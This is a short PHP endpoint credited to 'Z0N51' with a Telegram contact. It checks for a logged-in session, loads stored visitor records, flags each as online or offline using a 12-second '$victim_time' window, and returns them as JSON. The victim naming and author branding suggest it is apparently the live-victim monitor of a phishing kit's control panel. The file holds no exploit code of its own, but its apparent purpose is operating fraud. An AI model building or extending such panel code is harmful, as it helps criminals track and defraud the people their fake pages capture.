<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    include_once 'inc/app.php';

    if( !is_logged() ) {
        header("location: index.php");
        exit();
    }
    
    $visitors = get_data("visitors");

    $i = 0;
    if( $visitors ) {
        foreach($visitors as $result) {
            $period      = 12;
            $curtime     = time();
            $victim_time = $result['last_activity'] + $period;
            if( $victim_time > time() ) {
                $visitor_status = "online";
            } else {
                $visitor_status = "offline";
            }
            $visitors[$i]['online'] = $visitor_status;
            $i++;
        }
    }
    $result['data'] = $visitors;    
    echo json_encode($result);
    die();
?>
